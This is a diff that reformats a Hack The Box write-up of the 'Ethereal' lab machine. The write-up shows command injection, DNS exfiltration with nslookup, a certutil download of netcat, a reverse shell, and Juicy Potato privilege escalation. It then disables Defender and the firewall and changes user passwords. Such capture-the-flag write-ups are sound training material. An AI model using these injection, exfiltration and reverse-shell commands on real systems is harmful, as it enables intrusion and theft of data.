@@ -92,7 +92,7 @@ ftp> ls
 
 We'll download all the files to our Kali box so it's easier to look at files:
 
-```
+```bash
 root@kali:~/hackthebox/Machines/Ethereal# wget -r --no-passive ftp://10.10.10.106
 --2018-10-08 13:38:09--  ftp://10.10.10.106/
            => ‘10.10.10.106/.listing’
@@ -105,7 +105,7 @@ There's a lot of files on the `FTP`, the interesting one is `FDISK.zip`.
 
 First, we'll `unzip` it and determine it's a `FAT` filesystem.
 
-```
+```bash
 root@kali:~/hackthebox/Machines/Ethereal/10.10.10.106# unzip FDISK.zip 
 Archive:  FDISK.zip
   inflating: FDISK
@@ -117,7 +117,7 @@ FDISK: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID "MSDOS5.0", root entries 
 
 After mounting it, we found there's an `MS-DO`S executable `pbox.exe` file in there.
 
-```
+```bash
 root@kali:~/hackthebox/Machines/Ethereal/10.10.10.106# mount -t vfat -o loop FDISK /mnt
 root@kali:~/hackthebox/Machines/Ethereal/10.10.10.106# ls -l /mnt
 total 1
@@ -133,7 +133,8 @@ root@kali:~/hackthebox/Machines/Ethereal/10.10.10.106# file /mnt/pbox/pbox.exe
 
 To run this, we'll use `dosbox` and mount the Kali directory inside MS-DOS.
 
-```
+
+```bash
 root@kali:~/hackthebox/Machines/Ethereal/10.10.10.106# cd /mnt/pbox/
 root@kali:/mnt/pbox# dosbox
 DOSBox version 0.74-2
@@ -173,6 +174,7 @@ Archive:  cwsdpmi.zip
 
 Now we can run the `assword manager` but it asks for a password.
 
+
 ![](/assets/img/posts/ethereal/dosbox3.png)
 
 The password is easily guessed: `password`, we now have access to all the passwords.
@@ -184,8 +186,8 @@ Found multiple credentials; the only one that is useful is: `!C414m17y57r1k3s4g4
 ### Web enumeration
 
 There's a ton of useless crap and decoys on this box, notably:
-- Fake desktop with a troll face & flag
-- Fake members login page
+- Fake `Desktop` with a troll face & flag
+- Fake `Members` login page
 
 There's an administration page at `http://ethereal.htb:8080/`
 
@@ -207,8 +209,8 @@ We can validate we got RCE by pinging ourselves with `127.0.0.1 && ping 10.10.14
 
 The first IP is implicitely pinged by the script followed by our injected command after &&:
 
-```
-root@darkisland:~/hackthebox/Machines/Ethereal# tcpdump -nni tun0 icmp
+```bash
+root@kali:~/hackthebox/Machines/Ethereal# tcpdump -nni tun0 icmp
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
 14:30:51.029999 IP 10.10.10.106 > 10.10.14.23: ICMP echo request, id 1, seq 39, length 40
@@ -223,8 +225,8 @@ However we can exfil some data by using `nslookup`.
 
 For example, using the payload `127.0.0.1 && nslookup inject 10.10.14.23`, we get can get the box to do a query back to us:
 
-```
-root@darkisland:~# tcpdump -nni tun0 -vv port 53
+```bash
+root@kali:~# tcpdump -nni tun0 -vv port 53
 tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
 20:20:16.625986 IP (tos 0x0, ttl 127, id 8724, offset 0, flags [none], proto UDP (17), length 70)
     10.10.10.106.52125 > 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)
@@ -234,24 +236,24 @@ tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
     10.10.10.106.52127 > 10.10.14.23.53: [udp sum ok] 3+ AAAA? inject. (24)
 ```
 
-What we want is to exfil the output of commands, by using the following payload we can start to output some stuff:
+What we want is to exfil the output of commands, by using the following `payload` we can start to output some stuff:
 
 `FOR /F "tokens=1" %g IN 'whoami' do (nslookup %g 10.10.14.23)`
 
 Output:
 
-```
+```bash
 20:30:23.082437 IP (tos 0x0, ttl 127, id 8942, offset 0, flags [none], proto UDP (17), length 58)
     10.10.10.106.63713 > 10.10.14.23.53: [udp sum ok] 2+ A? etherealalan. (30)
 ```
 
-Now, it's not perfect, we can't exfil special characters or anything else that is not a valid character in a DNS query. So in the query above, we can guess that the real output should be `ethereal\alan` instead of `etherealalan`.
+Now, it's not perfect, we can't exfil special characters or anything else that is not a valid character in a `DNS query`. So in the query above, we can guess that the real output should be `ethereal\alan` instead of `etherealalan`.
 
-So if we're listing directories, we have to use the /b flag so it only returns the name of the directory/file otherwise we'll need to play with the token parameter to indicate which item to read from the output.
+So if we're listing directories, we have to use the `/b` flag so it only returns the name of the `directory/file` otherwise we'll need to play with the token parameter to indicate which item to read from the output.
 
 Another example listing directories: `FOR /F "tokens=1" %g IN 'dir /b c:\users' do (nslookup %g 10.10.14.23)`
 
-```
+```bash
 20:35:04.531929 IP (tos 0x0, ttl 127, id 9016, offset 0, flags [none], proto UDP (17), length 70)
     10.10.10.106.53805 > 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)
 20:35:06.823075 IP (tos 0x0, ttl 127, id 9017, offset 0, flags [none], proto UDP (17), length 70)
@@ -290,10 +292,10 @@ Another example listing directories: `FOR /F "tokens=1" %g IN 'dir /b c:\users' 
 
 We just listed `c:\users` and found the following directories:
 
-- c:\users\Administrator
-- c:\users\alan
-- c:\users\jorge
-- c:\users\rupal
+- `c:\users\Administrator`
+- `c:\users\alan`
+- `c:\users\jorge`
+- `c:\users\rupal`
 
 Doing things manually takes a long time so I started working on a python script to automate the process. [Overcast](https://www.hackthebox.eu/home/users/profile/9682) [[Blog](https://www.justinoblak.com/)] was also working on the box and was one step ahead of me. He shared with me a script he had already created.
 
@@ -358,7 +360,7 @@ We still need to mess with the token parameter when we have output with spaces i
 **whoami**
 
 ```bash
-root@darkisland:~/hackthebox/Machines/Ethereal# ./exfil_alan.py 
+root@kali:~/hackthebox/Machines/Ethereal# ./exfil_alan.py 
 $> whoami
 (col#)> 
 [+] Receiving data:
@@ -366,7 +368,9 @@ b'etherealalan'
 ```
 
 **dir c:\users\alan**
-```
+
+
+```bash
 $> dir /b c:\users\alan
 (col#)> 
 [+] Receiving data:
@@ -384,7 +388,8 @@ b'Videos'
 ```
 
 **dir c:\users\alan\desktop**
-```
+
+```bash
 $> dir /b c:\users\alan\desktop
 (col#)> 
 [+] Receiving data:
@@ -394,7 +399,7 @@ b'note-draft\x03txt'
 Too bad, there's no flag... let's keeping looking.
 
 **dir c:\inetpub\wwwroot**
-```
+```bash
 $> dir /b c:\inetpub\wwwroot
 (col#)> 
 [+] Receiving data:
@@ -412,8 +417,8 @@ Wow, so we didn't even need the credentials from the password manager have we kn
 
 I got really stuck at this point and spent the next several hours trying to find ways to get a proper shell, or find hidden files that would allow me to get unstuck. I didn't get far until at some point after I had switched the path invoked by the script to use the unauthenticated page on port 80, I realized that the `whoami` output I was now getting was different.
 
-```
-root@darkisland:~/hackthebox/Machines/Ethereal# ./exfil_iis.py 
+```bash
+root@kali:~/hackthebox/Machines/Ethereal# ./exfil_iis.py 
 $> whoami
 (col#)> 
 [+] Receiving data:
@@ -426,8 +431,8 @@ After wasting a few more hours, I realized that AppLocker isn't enabled for user
 
 To test this, I first tried a command that I know will work: `127.0.0.1 && whoami && ping 10.10.14.23`
 
-```
-root@darkisland:~# tcpdump -nni tun0 icmp
+```bash
+root@kali:~# tcpdump -nni tun0 icmp
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
 21:02:19.817657 IP 10.10.10.106 > 10.10.14.23: ICMP echo request, id 1, seq 63, length 40
@@ -450,14 +455,14 @@ First, I tested locally on my Windows machine if running certutil.exe without pa
 
 Then I verified that certutil.exe is not blocked now that we are running as IIS: `127.0.0.1 && certutil.exe && ping 10.10.14.23`.
 
-```
+```bash
 21:06:30.214884 IP 10.10.10.106 > 10.10.14.23: ICMP echo request, id 1, seq 71, length 40
 21:06:30.214912 IP 10.10.14.23 > 10.10.10.106: ICMP echo reply, id 1, seq 71, length 40
 21:06:31.286151 IP 10.10.10.106 > 10.10.14.23: ICMP echo request, id 1, seq 72, length 40
 21:06:31.286182 IP 10.10.14.23 > 10.10.10.106: ICMP echo reply, id 1, seq 72, length 40
 ```
 
-We're getting pinged so the certutil.exe command didn't error out. 
+We're getting pinged so the `certutil.exe` command didn't error out. 
 
 While previously looking at the files and programs on the box, I found `c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe"` installed (and it wasn't AppLocked for `alan` user either), so I used this to establish outbound sockets.
 
@@ -471,9 +476,9 @@ I modified the existing script to scan for the first 200 ports:
         send(cmd, 1)
 ```
 
-I used Wireshark to look for incoming SYN packets and started the scan.
+I used `Wireshark` to look for incoming `SYN packets` and started the scan.
 
-```
+```bash
 root@darkisland:~/hackthebox/Machines/Ethereal# ./scanport.py
 [...]
 "c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -host 10.10.14.23 -port 72
@@ -487,11 +492,11 @@ root@darkisland:~/hackthebox/Machines/Ethereal# ./scanport.py
 "c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -host 10.10.14.23 -port 138
 ```
 
-From the pcap, I identified inbound connections on port 73 and 136.
+From the pcap, I identified inbound connections on port `73` and `136`.
 
 ![](/assets/images/htb-writeup-ethereal/wireshark.png)
 
-Now, we just need to get netcat uploaded to the server and try to get a proper shell.
+Now, we just need to get netcat uploaded to the `server` and try to get a proper shell.
 
 First, let's start an HTTP listener on port 73 to host nc.exe, then issue `certutil.exe -urlcache -split -f http://10.10.14.23:73/nc.exe c:\users\public\desktop\shortcuts\nc.exe`
 
@@ -505,7 +510,7 @@ We finally got a shell!
 
 Our IIS user has `SeImpersonatePrivilege` so we can probably do Rotten Potato.
 
-```
+```bash
 c:\windows\system32\inetsrv>whoami
 iis apppool\defaultapppool
 
@@ -525,9 +530,9 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
 
-I used Juicy Potato from Decoder.
+I used `Juicy Potato` from Decoder.
 
-```
+```bash
 c:\windows\system32\inetsrv>cd \users\public 
 cd \users\public
 
@@ -543,9 +548,9 @@ c:\Users\Public>cmd /c certutil.exe -urlcache -split -f http://10.10.14.23:73/Ju
 07/16/2016  02:23 PM    <DIR>          Videos
 ```
 
-Execute it, spawning yet another netcat:
+Execute it, `spawning` yet another `netcat`
 
-```
+```bash
 c:\Users\Public>JuicyPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\shortcuts\nc.exe -e cmd.exe 10.10.14.23 73" -t *
 JuicyPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\shortcuts\nc.exe -e cmd.exe 10.10.14.23 73" -t *                                                                                
 Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
@@ -560,8 +565,8 @@ c:\Users\Public>
 
 We got a shell as `nt authority\system`!
 
-```
-root@darkisland:~/hackthebox/Machines/Ethereal# nc -lvnp 73
+```bash
+root@kali:~/hackthebox/Machines/Ethereal# nc -lvnp 73
 listening on [any] 73 ...
 connect to [10.10.14.23] from (UNKNOWN) [10.10.10.106] 49877
 Microsoft Windows [Version 10.0.14393]
@@ -574,9 +579,9 @@ nt authority\system
 C:\Windows\system32>
 ```
 
-Strange... we don't have read access to the flags even though we are SYSTEM:
+Strange... we don't have read access to the flags even though we are `SYSTEM`
 
-```
+```bash
 C:\Windows\system32>cd \users\jorge\desktop
 cd \users\jorge\desktop
 
@@ -598,7 +603,7 @@ type user.txt
 Access is denied.
 ```
 
-Looking at the flags, we see that the file is encrypted:
+Looking at the `flags`, we see that the file is` encrypted`
 
 ```bash
 PS C:\users\jorge\desktop> get-itemproperty -path user.txt  | Format-list -Property *
@@ -616,7 +621,7 @@ Attributes        : Archive, Encrypted
 
 Same thing for the root.txt file in `c:\users\rupal\desktop\root.txt`
 
-I found some cert and private key files on the D: drive
+I found some cert and private key files on the `D: drive`
 
 ```bash
 PS D:\certs> dir
@@ -631,14 +636,16 @@ Mode                LastWriteTime         Length Name
 -a----         7/1/2018  10:26 PM           1196 MyCA.pvk
 ```
 
-I thought of googling for ways to recover EFS encrypted files but instead I just YOLOed it:
+I thought of googling for ways to recover `EFS encrypted` files but instead I just `YOLOed` it:
 
-Attack plan:
 
-- Disable Windows Defender
-- Disable Firewall
-- Change Rupal and Jorge's passwords
-- RDP in and steal their shit
+Attack plan
+=============
+
+- `Disable Windows Defender`
+- `Disable Firewall`
+- `Change Rupal and Jorge's passwords`
+- `RDP in and steal their shit`
 
 ```bash
 PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true
@@ -655,7 +662,7 @@ net users jorge Yoloed1234!
 The command completed successfully.
 ```
 
-Sweet, RDP is already running, no need to enable it:
+Sweet, `RDP` is already running, no need to enable it:
 
 ```bash
 PS C:\> netstat -an                
@@ -677,5 +684,5 @@ At last, we can RDP and get the flags!!
 
 ![](/assets/img/posts/ethereal/.png)
 
-![](/assets/img/posts/ethereal/72ng))
+![](/assets/img/posts/ethereal/72.png)
 
